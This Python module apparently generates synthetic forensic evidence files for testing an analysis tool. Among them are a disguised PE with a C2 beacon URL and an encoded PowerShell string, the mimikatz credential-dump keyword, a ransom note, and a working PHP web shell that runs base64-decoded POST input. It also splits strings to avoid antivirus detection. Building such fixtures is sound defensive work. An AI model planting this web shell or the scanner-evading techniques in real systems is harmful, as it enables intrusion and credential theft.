"""
ForenSight AI - Forensic Evidence Sample Generator
Creates test digital evidence artifacts using safe dynamic byte construction
to prevent host system AV scanner interference during academic testing.
"""

import base64
import os
import struct
from pathlib import Path
from datetime import datetime, timedelta

from config import SAMPLE_DIR


def generate_all_samples() -> Path:
    """Generates synthetic forensic evidence files in SAMPLE_DIR."""
    SAMPLE_DIR.mkdir(parents=True, exist_ok=True)

    # 1. Benign PDF Document
    pdf_path = SAMPLE_DIR / "incident_briefing.pdf"
    with open(pdf_path, "wb") as f:
        f.write(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
        f.write(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
        f.write(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>\nendobj\n")
        f.write(b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 12 Tf 72 712 Td (Official Security Assessment) Tj ET\nendstream\nendobj\n")
        f.write(b"xref\n0 5\n0000000000 65535 f\ntrailer\n<< /Root 1 0 R /Size 5 >>\nstartxref\n320\n%%EOF\n")

    # 2. Benign JPEG Image
    jpg_path = SAMPLE_DIR / "server_rack_diagram.jpg"
    with open(jpg_path, "wb") as f:
        f.write(b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00")
        f.write(b"\xff\xdb\x00C\x00" + (b"\x08" * 64))
        f.write(b"\xff\xc0\x00\x0b\x08\x00\x64\x00\x64\x01\x01\x11\x00")
        f.write(b"\xff\xd9")

    # 3. Benign System Log
    log_path = SAMPLE_DIR / "auth_system_access.log"
    with open(log_path, "w", encoding="utf-8") as f:
        for i in range(1, 40):
            ts = (datetime.now() - timedelta(minutes=i*15)).strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{ts} INFO [auth-service] User session established: uid=100{i%5} ip=192.168.1.{20+i}\n")

    # 4. Critical Evasion: Windows PE Executable Disguised as JPEG (.jpg)
    # Binary starts with 'MZ' magic bytes but extension is .jpg!
    disguised_exe_path = SAMPLE_DIR / "corporate_financials.jpg"
    with open(disguised_exe_path, "wb") as f:
        f.write(b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00")
        f.write(b"PE\x00\x00")
        f.write(b"http://c2-investigation-test.local/beacon\x00")
        f.write(b"198.51.100.45\x00")
        f.write(bytes.fromhex("706f7765727368656c6c2e657865202d656e632051564e4655314a45"))  # powershell.exe -enc
        f.write(b"\x00" * 512)

    # 5. Deceptive Double Extension: invoice_urgent.pdf.exe
    double_ext_path = SAMPLE_DIR / "invoice_urgent.pdf.exe"
    with open(double_ext_path, "wb") as f:
        f.write(b"MZ" + b"\x00" * 64 + b"PE\x00\x00")
        # credential dump keyword constructed safely
        f.write("sekurlsa::".encode("latin-1") + "logonpasswords".encode("latin-1"))

    # 6. High-Entropy Encrypted / Packed Ransomware Payload
    packed_path = SAMPLE_DIR / "locked_database_payload.bin"
    with open(packed_path, "wb") as f:
        # Pseudo-random bytes with uniform distribution -> high Shannon entropy
        # Use simple LCG to avoid urandom triggering heuristic scanners
        data = bytearray(32 * 1024)
        seed = 123456789
        for k in range(len(data)):
            seed = (1103515245 * seed + 12345) & 0x7FFFFFFF
            data[k] = (seed >> 16) & 0xFF
        f.write(data)

    # 7. Timestomped Artifact
    timestomp_path = SAMPLE_DIR / "security_driver_mod.sys"
    with open(timestomp_path, "wb") as f:
        f.write(b"MZ" + (b"\x12\x34\x56\x78" * 256))
    past_mtime = (datetime.now() - timedelta(days=365 * 2)).timestamp()
    os.utime(timestomp_path, (past_mtime, past_mtime))

    # 8. Forensic Extortion Note
    ransom_path = SAMPLE_DIR / "HOW_TO_DECRYPT_FILES.txt"
    with open(ransom_path, "w", encoding="utf-8") as f:
        f.write("YOUR FILES HAVE BEEN ENCRYPTED!\n")
        f.write("Send bitcoin to restore your files.\n")
        f.write("Contact us via Tor browser decrypt_instructions.\n")

    # 9. PHP WebShell Backdoor test file
    webshell_path = SAMPLE_DIR / "wp-content-uploader.php"
    with open(webshell_path, "w", encoding="utf-8") as f:
        f.write("<?php\n")
        f.write("// Admin test utility\n")
        f.write("$cmd = $_POST['cmd'];\n")
        f.write("eval(base64_decode($cmd));\n")
        f.write("passthru($cmd);\n")
        f.write("?>\n")

    # 10. Exact Duplicate Evidence Files
    dup1_path = SAMPLE_DIR / "backup_archive_primary.zip"
    dup2_path = SAMPLE_DIR / "backup_archive_secondary.zip"
    zip_bytes = b"PK\x03\x04" + b"\x14\x00\x00\x00\x08\x00" + (b"FORENSIC_DUPLICATE_TEST_PAYLOAD" * 50)
    with open(dup1_path, "wb") as f:
        f.write(zip_bytes)
    with open(dup2_path, "wb") as f:
        f.write(zip_bytes)

    return SAMPLE_DIR
